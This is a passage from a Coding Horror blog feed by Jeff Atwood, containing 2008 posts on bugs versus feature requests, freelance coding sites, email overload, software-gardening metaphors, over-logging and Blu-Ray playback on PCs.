It's an insoluble problem. Furthermore, I think most bug tracking systems fail us because <i>they make us ask the wrong questions</i>. They force you to pick a side. <a href="http://www.straightdope.com/columns/read/2269/how-did-the-hatfield-mccoy-feud-end-anyway">Hatfields vs. McCoys</a>. Coke vs. Pepsi. Bug vs. Feature Request. It's a painful and arbitrary decision, because most of the time, it's <i>both</i>. <b>There's no difference between a bug and a feature request from the user's perspective.</b> If you want to do something with an application (or website) and you can't do it because that feature isn't implemented -- how is that any different than not being able to do something due to an error message?
</p>
<p>
Consider an example: <a href="http://weblogs.asp.net/KDente/archive/2005/03/13/394499.aspx">Visual Studio doesn't use the correct font when building Windows applications</a>. Is this a bug or a feature request?
</p>
<p>
Personally, <b>I consider this a bug</b>. I guess Microsoft does too, at least in theory, because it's been <a href="http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=115408">in Microsoft's Connect bug tracking system</a> for over four years now. When you build a Windows application, wouldn't you expect it to use the default font of the underlying operating system you're running it on, unless you've explicitly told it otherwise? Well, guess what happens when you create a new form in Visual Studio 2008 and instantiate a label control.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Party like it's 1996, folks, because you'll get MS Sans Serif, and <i>you'll like it</i>. That is the default for each new form. Never mind that every new application you build will look like -- let me put this as delicately as I can -- <i>ass</i>.
</p>
<p>
Here's a comparison of a label with the default font, versus one that was explicitly set to the default GUI font.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Judging by the applications I've used, most Windows developers couldn't care less about design. That's bad. What's even worse is learning that same design carelessness has shipped in the box with every copy of Visual Studio since 2002.
</p>
<p>
Of course, matters of design are so <i>subjective</i>. If only there were some definitive source we could refer to on the matter of proper Windows GUI font usage. Some sort of reference standard, as it were. Like, say, the <a href="http://msdn.microsoft.com/en-us/library/aa511327.aspx">top rules for Windows Vista User Experience</a> from Microsoft:
</p>
<p>
</p>
<ol>
<li><a href="http://msdn.microsoft.com/en-us/library/aa511327.aspx#aero">Use the Aero Theme and System Font (Segoe UI)</a></li>
<li><a href="http://msdn.microsoft.com/en-us/library/aa511327.aspx#controls">Use common controls and common dialogs</a></li>
<li><a href="http://msdn.microsoft.com/en-us/library/aa511327.aspx#frames">Use the standard window frame, use glass judiciously</a></li>
</ol>
<p>
There are 12 rules in total, but the rule I'm looking for is right at the top -- <b>applications should use the system font</b>.
</p>
<p>
The hilarity of this list is already sort of self evident, given that I've written an entire post <a href="http://www.codinghorror.com/blog/archives/001126.html">bemoaning the general lack of fit and finish in Windows Vista</a>. I couldn't help but laugh at rule number 12: <a href="http://msdn.microsoft.com/en-us/library/aa511327.aspx#fitandfinish">Reserve time for "fit and finish"!</a> Now <i>there's</i> a rule Microsoft should have taken to heart while developing Windows Vista. Understand this is all coming from a guy who <i>likes</i> Vista.
</p>
<p>
But I digress.
</p>
<p>
Despite the windows forms font behavior in Visual Studio 2008 contradicting <i>rule number one</i> of Microsoft's own design guidelines, this "bug" has gone unfixed for over four years. It has been silently reclassified as a "feature request" and effectively ignored. Nothing's broken, after all: using the wrong font hasn't caused any application crashes or lost productivity. On the other hand, imagine how many BigCorpCo apps have been built since then that <b>violate Microsoft's own design rules for their platform</b>. Either because the developers didn't realize that the app font didn't match the operating system, or because they didn't have the time to write the workaround code necessary to make it do the right thing.
</p>
<p>
Yes, this is a small thing. And I'm sure fixing it wouldn't result in selling an additional umpteen thousand Visual Studio licenses to BigCorpCo, which is why it hasn't happened yet.
</p>
<p>
But the question remains: is this a bug, or a feature request?
</p>
<p>
One of my favorite things about <a href="http://uservoice.com/">UserVoice</a> -- which we use for Stack Overflow -- is the way it intentionally blurs the line between bugs and feature requests. Users never understand the difference anyway, and what's worse, developers tend to use that division as a wedge <i>against</i> users. Nudge things you don't want to do into that "feature request" bucket, and proceed to ignore them forever. Argue strongly and loudly enough that something reported as a "bug" clearly isn't, and you may not have to to do any work to fix it. Stop dividing the world into Bugs and Feature Requests, and both of these project pathologies go away.
</p>
<p>
I wish we could, as an industry, spend less time fighting tooth and nail over definitions, painstakingly placing feedback in the "bug" or "feature request" buckets -- and more time <b>doing something constructive with our users' feedback</b>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-19T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/thats-not-a-bug-its-a-feature-request/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Can You Really Rent a Coder? ]]></title>
<link>https://blog.codinghorror.com/can-you-really-rent-a-coder/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I've been a fan of Dan Appleman for about as long as I've been a professional programmer. He is one of my heroes. Unfortunately, Dan only <a href="http://www.danappleman.com/">blogs</a> rarely, so I was heartened to see a spate of recent blog updates from him. One of the entries asks a question I've often wondered myself: <a href="http://www.danappleman.com/?p=68">can you really rent a coder?</a>
</p>
<p>
</p>
<blockquote>
Over the past year or two I've kept an eye on the various online consulting sites - <a href="http://www.elance.com/">Elance</a>, <a href="http://www.guru.com/">guru.com</a>, <a href="http://www.rentacoder.com/">RentACoder</a>, <a href="http://www.odesk.com/">oDesk</a>. I've actually used RentACoder once (as a buyer on a very small project) and was satisfied with the results -- though I suspect I spent more time writing the spec and managing the programmers than I would if I had done the work myself.
</blockquote>
<p>
I'm surprised Dan opens with such a sunny outlook on these services, because I've heard almost universally negative things about them. As professional programmers, I think we're all naturally inclined to <b>see these sort of low-bid contract sites as cannibalizing and cheapening our craft.</b> It's roughly analogous to the <a href="http://www.no-spec.com/">No-Spec movement</a> for designers.
</p>
<p>
The odd thing is that, despite the sunny outlook, <a href="http://www.examiner.com/x-1652-Gadgets-Examiner~y2008m11d14-oDesk-Guru-Elance-and-RentACoder--Are-they-worth-it">the article Dan wrote on this topic</a> comes across as quite cautionary:
</p>
<p>
</p>
<blockquote>
<ul>
<li>
<b>You'll be competing with people around the world.</b> In fact, you'll be amazed at how little people in some parts of the world will bid. That's because a few dollars an hour can work well in a country where the average wage is a couple of hundred dollars a month.<br><br>
</li>
<li>
<b>Many of the projects posted are unrealistic</b>. For example, people asking for a clone of ebay for under $500. What ends up happening in these cases is that usually somebody ends up getting ripped off (either the client or the consultant who underbid or fails to deliver).<br><br>
</li>
<li>
<b>A lot of projects go bad.</b> They get cancelled. Or the consultant who bid on the work never delivered, or delivered poor results. Or the client has unreasonable expectations, or doesn't actually know what he wants.
</li>
</ul>
</blockquote>
<p>
Maybe it's just my natural bias talking, but these sites seem awfully impractical to me.
</p>
<p>
Simply sorting out the DailyWTF project pitches from things you could actually deliver -- at ultra-competitive offshore programming rates, no less -- would require the patience of a saint and the endurance of an olympic athlete. Specification documents are hard enough to write when everyone involved is a coworker sitting in the same room. I can't even imagine the difficulty of <b>agreeing on what it is you're building</b> when the participants are thousands of miles away and have never met. But then <a href="http://www.codinghorror.com/blog/archives/000828.html">I thought Amazon's Mechanical Turk was a failure</a>, and it seems to be enjoying a moderate level of success.
</p>
<p>
Dan has a small chart <a href="http://thethriftygeek.com/2008/11/comparing-the-online-consulting-sites/">comparing the services of these online freelance/consulting sites</a>. It's too easy to write these sites off as an affront to software engineering. I guess they're <b>sort of like dating sites</b> -- they might be one way to find a client relationship, but I'd be highly suspicious of any professional developer who can't find a stable, long term relationship with a client eventually.
</p>
<p>
If nothing else, we should be looking at them for research purposes, as a baseline. Surely you can demonstrate better value to your employer than the random, anonymous programmers on <a href="http://www.elance.com/">Elance</a>, <a href="http://www.guru.com/">guru.com</a>, <a href="http://www.rentacoder.com/">RentACoder</a>, or <a href="http://www.odesk.com/">oDesk</a>. And I'd certainly hope that the projects you're working on are more sensible and rewarding (in both senses of the word) than the stuff that appears on those sites.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-23T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/can-you-really-rent-a-coder/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Is Email = Efail? ]]></title>
<link>https://blog.codinghorror.com/is-email-efail/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
While I've always practiced reasonable <a href="http://www.w-uh.com/articles/030308-tyranny_of_email.html">email</a> <a href="http://www.w-uh.com/articles/030316-tyranny_revisited.html">hygiene</a>, for the last 6 months I've been in near-constant <a href="http://www.43folders.com/2006/07/28/email-bankruptcy">email bankruptcy mode</a>.  This concerns me.
</p>
<p>
Yes, it's partly my fault <a href="http://www.codinghorror.com/blog/archives/000237.html">for being a world champion procrastinator</a>, but I'm not sure it's <i>entirely</i> my fault. There are forces at work here, factors that easily outstrip the efforts of any one measly human being, no matter how tenacious and dogged. Or, as in my case, no matter how lazy.
</p>
<p>
I've always liked <a href="http://www.43folders.com/2007/05/30/email-bankruptcy-2">Merlin Mann's explanation of this phenomenon</a>:
</p>
<p>
</p>
<blockquote>
Email is such a funny thing. People hand you these single little messages that are no heavier than a river pebble.
<p>
<img alt="image placeholder" >
</p>
<p>
But it doesn't take long until you have acquired a pile of pebbles that's taller than you and heavier than you could ever hope to move, even if you wanted to do it over a few dozen trips. For the person who took the time to hand you their pebble, it seems outrageous that you can't handle that one tiny thing. "What 'pile'? It's just a f**ing pebble!"
</p>
</blockquote>
<p>
The underlying problem is that <i>individual human beings don't scale</i>.
</p>
<p>
</p>
<blockquote>
<b>The net number of requests for my attention exceeds my ability to provide that attention by at least an order of magnitude.</b> And the disparity around my ability to thoughtfully respond to my pile may be ten or more times worse still. The scale is insanely out of whack.
</blockquote>
<p>
Email is certainly the backbone of the information economy, but it's also fundamentally and perhaps even fatally flawed. Tantek elik captured my thoughts perfectly with <a href="http://tantek.com/log/2008/02.html#d19t2359">this post</a>:
</p>
<p>
</p>
<blockquote>
Last year <a href="http://www.codinghorror.com/blog/archives/000866.html">when I posted The Three Hypotheses</a>, they helped me explain why I found email so much less useful/usable than instant messaging (IM) and Twitter. Since then, I find that while I can keep up with more people contacting me over IM and following more people on Twitter, email has simply become less and less usable. But not for reasons of interface; I'm using the email application now as I was a year ago.
<p>
I'm probably responding to less than 1 in 10 emails that are sent directly to me, and even fewer that were sent to a set of people or a list. The usability of email for me has deteriorated so much that I exclaimed on Twitter: <b>EMAIL shall henceforth be known as EFAIL</b>.
</p>
</blockquote>
<p>
The blanket equation of email with failure is strong language indeed, but it's a serious problem. The intrinsically low effort-to-reward ratio of private email is not necessarily a new idea; as I said in <a href="http://www.codinghorror.com/blog/archives/000840.html">When In Doubt, Make It Public</a>, it's almost never in anyone's best interest to keep their communications locked into private silos of any kind, email or otherwise. <b>Why answer one person's email directly when I could potentially answer a thousand different people's email with a single blog post?</b>
</p>
<p>
I urge you to <a href="http://tantek.com/log/2008/02.html#d19t2359">read the full text of Tantek's article</a>. He cuts to the heart of the email problem: size, in both the mental and physical dimensions.
</p>
<p>
</p>
<blockquote>
Email requires more of an interface cognitive load tax than instant messaging. People naturally put much more into an email, perhaps in an unconscious effort to amortize that email interface tax overhead across more content. People feel that since they are already "bothering" to write an email, they might as well take the time to go into all kinds of detail, perhaps even adding a few more things that they're thinking about.
<p>
Such natural message bloat places additional load on the recipient, both in terms of the raw length of the message, and in terms of the depth and variety of topics covered in the email. This results in a direct increase in processing time per email, making it even <i>harder</i> for people to process and respond. I know I've let numerous emails grow stale because there were simply too many different things in the email that required a response. I didn't want to send a response without responding to everything in the email because then I would inevitably receive yet <i>another</i> email response without being able to file the original as being processed and thus have the situation worsen!
</p>
</blockquote>
<p>
What we can to combat the email = efail problem? Take Tantek's advice: <b>whenever possible, avoid sending email</b>. Not because we don't want to communicate with our peers. Quite the contrary. We should avoid sending email out of a deep <i>respect</i> for our peers -- so that they are free to communicate as effectively and as often as possible with us.
</p>
<p>
</p>
<ol>
<li>
<b>Channel that private email effort into a public outlet.</b> Discussion boards, blog entries, comments, wikis, you name it. If it can be indexed by a web search engine, you're in the right place -- and many more people can potentially find, answer, and benefit from that information.<br><br>
</li>
<li>
<b>If you <i>must</i> send email, make it as short as possible.</b> Think of it as <a href="http://www.codinghorror.com/blog/archives/001184.html">Strunk and White on speed</a>. Can you reduce your email into a single paragraph? How about two sentences? How about just the title field with no body, even?<br><br>
</li>
<li>
<b>Remember the <a href="http://www.codinghorror.com/blog/archives/001064.html">theory of communication escalation</a></b>. Email is just one communication tool in our toolkit; that doesn't mean it is always the right one for whatever situation is at hand. Take advantage of phone calls, instant messaging, text messages, and so forth, as appropriate. Scale your choice of communication method to the type of conversation you're having, and don't be afraid to escalate it (or demote it!) as the ebb and flow of the conversation shifts.
</li>
</ol>
<p>
So if you've emailed me, and I haven't responded in a timely fashion, I apologize. I know it may sound crazy, but I've been desperately clawing my way out from under this mountain of pebbles.
</p>
<p>
p.s. Email me if you agree with this.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-25T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/is-email-efail/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Tending Your Software Garden ]]></title>
<link>https://blog.codinghorror.com/tending-your-software-garden/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Software: do you write it like a book, grow it like a plant, accrete it like a pearl, or construct it like a building? As Steve McConnell notes in <a href="http://www.amazon.com/exec/obidos/ASIN/0735619670/codihorr-20">Code Complete 2</a>, there's no shortage of <b>software development metaphors</b>:
</p>
<p>
</p>
<blockquote>
A confusing abundance of metaphors has grown up around software development. David Gries says <a href="http://books.google.com/books?id=vv5pot-ySsEC&amp;dq=%22david+gries%22+software+science&amp;pg=PP1&amp;ots=YtjTrk6clc&amp;source=bn&amp;sig=OVW2eoYseX6bERH5CFcLggiIbmc&amp;hl=en&amp;sa=X&amp;oi=book_result&amp;resnum=4&amp;ct=result">writing software is a science</a> (1981). Donald Knuth says <a href="http://en.wikipedia.org/wiki/The_Art_of_Computer_Programming">it's an art</a> (1998). Watts Humphrey says <a href="http://en.wikipedia.org/wiki/Personal_Software_Process">it's a process</a> (1989). <a href="http://en.wikipedia.org/wiki/P._J._Plauger">P. J. Plauger</a> and Kent Beck say it's like <a href="http://books.google.com/books?id=G8EL4H4vf7UC&amp;pg=PA28&amp;lpg=PA28&amp;dq=%22kent+beck%22+driving+car+2000&amp;source=web&amp;ots=j7uLsrlYxr&amp;sig=EydaBn1wL6kZY-KO0KTDYm0lgFk&amp;hl=en&amp;sa=X&amp;oi=book_result&amp;resnum=8&amp;ct=result">driving a car</a>, although they draw nearly opposite conclusions (Plauger 1993, Beck 2000). Alistair Cockburn says <a href="http://www.codinghorror.com/blog/archives/000826.html">it's a game</a> (2002). Eric Raymond says it's <a href="http://www.catb.org/~esr/writings/cathedral-bazaar/">like a bazaar</a> (2000). Andy Hunt and Dave Thomas say it's <a href="http://www.artima.com/intv/gardenP.html">like gardening</a>. Paul Heckel says it's <a href="http://www.amazon.com/dp/0782115381/?tag=codihorr-20">like filming Snow White and the Seven Dwarfs</a> (1994). Fred Brooks says that it's like farming, hunting werewolves, or <a href="http://en.wikipedia.org/wiki/The_Mythical_Man-Month">drowning with dinosaurs in a tar pit</a> (1995). Which are the best metaphors?
</blockquote>
<p>
I think we're leaving one metaphor on the table which more accurately reflects the way software is built in the real world: flail around randomly and pray you <a href="http://www.codinghorror.com/blog/archives/000889.html">succeed by force of pure dumb luck</a>. Sometimes it even works. <a href="http://www.codinghorror.com/blog/archives/000588.html">Not very often</a>, but just enough to confuse people who should know better into thinking they're smart, when what they really were is lucky.
</p>
<p>
The answer, of course, is <b>whichever metaphor helps you and your team get to the end of the project</b>. Personally, I see them as more of a battle cry, a way for a team to communicate a shared vision and a set of values. They're heavy on imagery and metaphor, and light on specific, concrete advice.
</p>
<p>
Even as Steve McConnell argues that most software development metaphors come up short, he quite clearly picks a favorite, and spends quite a bit of time defending his choice. It's not exactly a secret, as it's in the subtitle for the book: <a href="http://www.amazon.com/dp/0735619670/?tag=codihorr-20">Code Complete: A Practical Handbook of Software Construction</a>.
</p>
<p>
As much as I respect Steve, my software project experience to date doesn't match the controlled construction metaphor. I agree with Thomas Guest; <a href="http://wordaligned.org/articles/why-software-development-isnt-like-construction">software is soft; buildings aren't</a>. I'm more partial to the model that Andy Hunt and Dave Thomas promote, what I call <b>tending your software garden</b>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Programers as farmers, if you will.
</p>
<p>
All the best software projects I've worked were, for lack of a better word, <i>alive</i>. I don't mean that literally, of course. But the software was constantly and quite visibly growing. There were regular, frequent release schedules defining its evolution. There was a long term project commitment to a year out, five years out, ten years out.
</p>
<p>
To me, the parallels between farming and software development are strong and evocative. Steve disagrees.
</p>
<p>
</p>
<blockquote>
The weakness in the software-farming metaphor is its suggestion that you don't have any direct control over how the software develops. You plant the code seeds in the spring, <i>Farmer's Almanac</i> and the Great Pumpkin willing, you'll have a bumper crop of code in the fall.
</blockquote>
<p>
To be clear, all these metaphors are abstract and therefore heavily subject to interpretation (and/or useless, take your pick), so I don't want to get too wrapped up in defending one.
</p>
<p>
That said, I disagree with Steve's dismissal. The strength of the farming metaphor is the implied <b>commitment to the craft</b>. Farming is hard, unforgiving work, but there's a yearly and seasonal ritual to it, a deep underlying appreciation of sustainible and controlled growth, that I believe software developers would do well to emulate. I also think Steve was a bit unfair in characterizing farming as "no direct control". There's plenty of control, but lots of acknowledged variables, as well -- which I think more accurately represents the <a href="http://www.codinghorror.com/blog/archives/000298.html">shifting sands of software development</a>. Farmers do their best to control those variables, of course, but most of all they must adapt to whatever conditions they're dealt. Next season, next year, they know they'll be back with a renewed sense of purpose to try it all again and do better. Not so coincidentally, these are also traits shared by the best software developers I've known.
</p>
<p>
In particular, <b>the rise of the web software development model has made the farming model more relevant</b>. Where traditional software like Office might go through a bunch of monolithic, giant construction project updates every two to three years -- from Office XP, to Office 2003, to Office 2007 -- websites can be deployed far more often. Seasonally, if you will. Some websites even "harvest" monthly, organically growing new features and bugfixes each time. The guys at 37Signals <a href="http://www.37signals.com/svn/posts/591-brainstorm-the-software-garden">apparently noticed this, too</a>.
</p>
<p>
</p>
<blockquote>
It recently dawned on me that software grows much in the same way that plants grow. New features are the flowers of the software world. And just as most plants aren't flowering all year long, software isn't sprouting features all year long. There's flowering season. There's new feature season. There's infrastructure season.
<p>
Sometimes software is working on its roots. Bolstering its infrastructure. It's growing underground where the public can't see it. It looks like nothing's happening, but there's really a lot going on. Without those roots new features can't sprout.
</p>
<p>
And sometimes it's rest time. Plants rest in the winter. Software often rests in the summer (it's too nice to work too hard in the summer). Everything can benefit from a deep breath, relaxation, and sleep. Chaotic constant growth and change doesn't make room for order and organization. Growth requires new energy and new energy requires rest.
</p>
</blockquote>
<p>
Another thing I've noticed is that tending to websites, which usually have community features and user-generated content at the forefront, feels a heck of a lot like <a href="http://www.codinghorror.com/blog/archives/001009.html">weeding your garden</a>. You grow a lot of content, but not all of it is exactly what you had in mind.
</p>
<p>
</p>
<blockquote>
I scrutinize every comment, and I remove a tiny percentage of them: they might be outright spam, patently off-topic, or just plain mean. I like to refer to this as weeding my web garden. It's a productivity tax you pay if you want to grow a bumper crop of comments, which, <a href="http://www.joelonsoftware.com/items/2007/07/20.html">despite what Joel says</a>, often <a href="http://www.codinghorror.com/blog/archives/000538.html">bear such wonderful fruit</a>. The labor can be minimized with improved equipment, but it's always there in some form. And I'm OK with that. The myriad benefits of a robust comment ecosystem outweighs the minor maintenance effort.
</blockquote>
<p>
And when you don't weed your garden?  The weeds threaten to choke out your crops. Eventually, your software garden looks neglected, and then abandoned.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
As Steve says, some software development metaphors are better than others. But when it comes to web development, at least, you could certainly do a lot worse than <b>tending to your software garden</b>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-11-30T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/tending-your-software-garden/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Problem With Logging ]]></title>
<link>https://blog.codinghorror.com/the-problem-with-logging/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
A recent Stack Overflow post described <a href="http://stackoverflow.com/questions/153524/code-to-logging-ratio#153547">one programmer's logging style</a>. Here's what he logs:
</p>
<p>
</p>
<blockquote>
<p><strong>INFO Level</strong></p>
<ul>
<li>The start and end of the method</li>
<li>The start and end of any major loops</li>
<li>The start of any major case/switch statements</li>
</ul>
<p><strong>DEBUG Level</strong></p>
<ul>
<li>Any parameters passed into the
method</li>
<li>Any row counts from result sets I retrieve</li>
<li>Any datarows that may contain suspicious data when being passed down to the method </li>
<li>Any "generated" file paths, connection strings, or other values that could get mungled up when being "pieced together" by the environment.</li>
</ul>
<p><strong>ERROR Level</strong></p>
<ul>
<li>Handled exceptions</li>
<li>Invalid login attempts (if security is an issue)</li>
<li>Bad data that I have intercepted forreporting</li>
</ul>
<p><strong>FATAL Level</strong></p>
<ul>
<li>Unhandled exceptions.</li>
</ul>
</blockquote>
<p>
I don't mean to single out <a href="http://www.dillieodigital.net/">the author</a> here, but this strikes me as a bit .. excessive.
</p>
<p>
Although I've never been a particularly big logger, myself, one of my teammates on Stack Overflow is. So when building Stack Overflow, we included <a href="http://logging.apache.org/log4net/index.html">log4net</a>, and logged a bunch of information at the various levels. I wasn't necessarily a big fan of the approach, but I figured what's the harm.
</p>
<p>
Logging does have a certain seductive charm. <b>Why not log as much as you can whenever you can?</b> Even if you're not planning to use it today, who knows, it might be useful for troubleshooting tomorrow. Heck, just log everything! What could it possibly hurt?
</p>
<p>
Oh, sure, logging seems harmless enough, but let me tell you, it can deal some <i>serious</i> hurt. We ran into a particularly nasty recursive logging bug:
</p>
<p>
</p>
<ul>
<li>On thread #1, our code was doing Log (lock) / DB stuff (lock)
</li>
<li>On thread #2, our code was doing DB stuff (lock) / log stuff (lock)
</li>
</ul>
<p>
If these things happened close together enough under heavy load, this resulted in -- you guessed it -- a classic out-of-order deadlock scenario. I'm not sure you'd ever see it on a lightly loaded app, but on our website it happened about once a day on average.
</p>
<p>
I don't blame log4net for this, I blame our crappy code. We spent days troubleshooting these deadlocks by .. wait for it .. <b>adding more logging!</b> Which naturally made the problem worse and even harder to figure out. We eventually were forced to <a href="http://blogs.msdn.com/tess/archive/2008/05/21/debugdiag-1-1-or-windbg-which-one-should-i-use-and-how-do-i-gather-memory-dumps.aspx">take memory dumps</a> and use dump analysis tools. With the generous assistance of <a href="http://samuraiprogrammer.com/community/Default.aspx">Greg Varveris</a>, we were finally able to identify the culprit: our logging strategy. How ironic. And I mean <i>real</i> irony, <a href="http://www.youtube.com/watch?v=nT1TVSTkAXg">not the fake Alanis Morrissette kind</a>.
</p>
<p>
Although I am a strong believer in logging exceptions, I've never been a particularly big fan of logging in the general "let's log everything we possibly can" sense:
</p>
<p>
</p>
<ol>
<li>
<b>Logging means more code</b>. If you're using a traditional logging framework like log4net, every logged event is at least one additional line of code. The more you log, the larger your code grows. This is a serious problem, because <a href="http://www.codinghorror.com/blog/archives/000878.html">code is the enemy</a>. Visible logging code is clutter -- <a href="http://www.codinghorror.com/blog/archives/001150.html">like excessive comments</a>, it actively obscures the code that's doing the real work in the application. <br><br>
</li>
<li>
<b>Logging isn't free.</b> Most logging frameworks are fairly efficient, but they aren't infinitely fast. Every log row you write to disk has an overall performance cost on your application. This can also be tricky if you're dissecting complex objects to place them in the log; that takes additional time.<br><br>
</li>
<li>
<b>If it's worth saving to a logfile, it's worth showing in the user interface</b>. This is the paradox: if the information you're logging is at all valuable, it deserves to be surfaced in the application itself, not buried in an anonymous logfile somewhere. Even if it's just for administrators. Logfiles are all too often where useful data goes to die, alone, unloved and ignored. <br><br>
</li>
<li>
<b>The more you log, the less you can find.</b> Log enough things and eventually your logs are so noisy nobody can find anything. It's all too easy to bury yourself in an avalanche of log data. Heck, that's the default: any given computer is perfectly capable of generating more log data than any of us could possibly deal with in our lifetime. The hidden expense here isn't the logging, it's the brainpower needed to make sense of these giant logs. I don't care how awesome your log parsing tools are, nobody looks forward to mining a gigabyte of log files for useful diagnostic information. <br><br>
</li>
<li>
<b>The logfile that cried Wolf.</b> Good luck getting everyone on your team to agree on the exact definitions of FATAL, ERROR, DEBUG, INFO, and whatever other logging levels you have defined. If you decide to log only the most heinous serial-killer mass-murderer type problems, evil has a lot less room to lurk in your logfiles -- and it'll be a heck of a lot less boring when you <i>do</i> look.
</li>
</ol>
<p>
So <b>is logging a giant waste of time?</b> I'm sure some people will read about this far and draw that conclusion, no matter what else I write. I am not anti-logging. I am anti-<i>abusive</i>-logging. Like any other tool in your toolkit, when used properly and appropriately, it can help you create better programs. The problem with logging isn't the logging, per se -- it's the seductive OCD "just one more bit of data in the log" trap that programmers fall into when <i>implementing</i> logging. Logging gets a bad name because it's so often abused. It's a shame to end up with all this extra code generating volumes and volumes of logs that aren't helping anyone.
</p>
<p>
We've since removed all logging from Stack Overflow, relying exclusively on exception logging. Honestly, I don't miss it at all. I can't even think of a <i>single</i> time since then that I'd wished I'd had a giant verbose logfile to help me diagnose a problem.
</p>
<p>
When it comes to logging, the right answer is not "yes, always, and as much as possible." <b>Resist the tendency to log everything.</b> Start small and simple, logging only the most obvious and critical of errors. Add (or ideally, inject) more logging only as demonstrated by specific, verifiable needs.
</p>
<p>
If you aren't careful, those individual log entries, as wafer thin as they might be, have a disturbing tendency to make your logs <a href="http://www.youtube.com/results?search_query=mr+creosote">end up like the unfortunate Mr. Creosote</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-03T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-problem-with-logging/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Blu-Ray: Is It Time? ]]></title>
<link>https://blog.codinghorror.com/blu-ray-is-it-time/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I've been monitoring the progress of high-definition video playback on the PC for quite a while now:
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.codinghorror.com/blog/archives/000747.html">Next-Gen DVD: Are Those Additional Pixels Worth Your Money?</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000746.html">High-Definition Video on the PC</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000758.html">Is Your PC Capable of Hi-Def?</a>
</li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000756.html">Will Your Next Computer Monitor Be a HDTV?</a>
</li>
</ul>
<p>
It's been almost two years since I wrote that series, and I think we're <b>dangerously close to viable high definition video playback on typical, mainstream PCs</b>. One metric I follow closely is the price of the hardware, and OEM Blu-Ray drives are <a href="http://www.newegg.com/Product/Product.aspx?Item=N82E16827136154">now only $99 shipped</a>.
</p>
<p>
<a href="http://www.newegg.com/Product/Product.aspx?Item=N82E16827136154"><img alt="image placeholder" >
</p>
<p>
This drive is a DVD burner, in addition to playing HD-DVDs, Blu-Ray, and obviously DVDs -- and it also has very positive customer reviews. I couldn't resist, so I bought one.
</p>
<p>
I have no need for a standalone Blu-Ray player, but a cursory look tells me those are down to <a href="http://www.anrdoezrs.net/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16882103400%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Blu-Ray%2BPlayers-_-Panasonic-_-82103400&amp;cjsku=N82E16882103400">around $250 for decent models</a>. And then of course there's always the <a href="http://www.amazon.com/dp/B001COU9I6/?tag=codihorr-20">PlayStation 3 option</a>.
</p>
<p>
It's a shame OS X and Vista don't natively support HD playback of any kind (although Vista does include some copy protection mechanisms specific to high-definition video playback, which was the <a href="http://www.cs.auckland.ac.nz/~pgut001/pubs/vista_cost.html">source of great hue and outrage</a>). When you pair this $99 drive with some third party playback software like PowerDVD HD or WinDVD HD, you're set.
</p>
<p>
I'm particularly interested in high definition PC playback because the <a href="http://www.codinghorror.com/blog/archives/001107.html">home theater PC I recently built</a> is more than capable:
</p>
<p>
</p>
<ul>
<li>Built in HDMI out (on the motherboard)
</li>
<li>Onboard video that <a href="http://techreport.com/articles.x/14261/9">supports H.264 acceleration</a>
</li>
<li>A modern dual-core CPU
</li>
</ul>
<p>
Also, I finally own a true 1920 x 1080 HDTV now -- yes, you can all stop making fun of me for using a creaky old brass and steam powered 852 x 480 EDTV -- so all the pieces are now in place for me to adopt Blu-Ray. I switched my <a href="http://www.netflix.com/Genre/Blu-ray/2444">Netflix account over to Blu-Ray</a> this morning.
</p>
<p>
I'm not quite a high definition video early adopter, but I'm still on the leading edge of the curve. <b>Funny how technology cycles repeat themselves.</b> I distinctly recall being an early adopter of DVDs back in 1998, almost exactly 10 years ago. The 720 x 480 resolution and Dolby Digital sound seemed so impressive back then. I remember marvelling at the fancy interactive menus on the Austin Powers DVD. Of course, DVD quality is <a href="http://www.codinghorror.com/blog/archives/000124.html">pretty pedestrian by today's standards</a>. We've <i>almost</i> gotten to the point where DVD-level video quality is available worldwide in a typical web browser, not necessarily <a href="http://www.codinghorror.com/blog/archives/000755.html">through YouTube</a>, but <a href="http://www.vimeo.com/highdef">through Vimeo</a> and other alternatives.
</p>
<p>
With that in mind, I wonder how quaint Blu-Ray will seem in 2018?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-04T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/blu-ray-is-it-time/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Our Hacker Odyssey ]]></title>
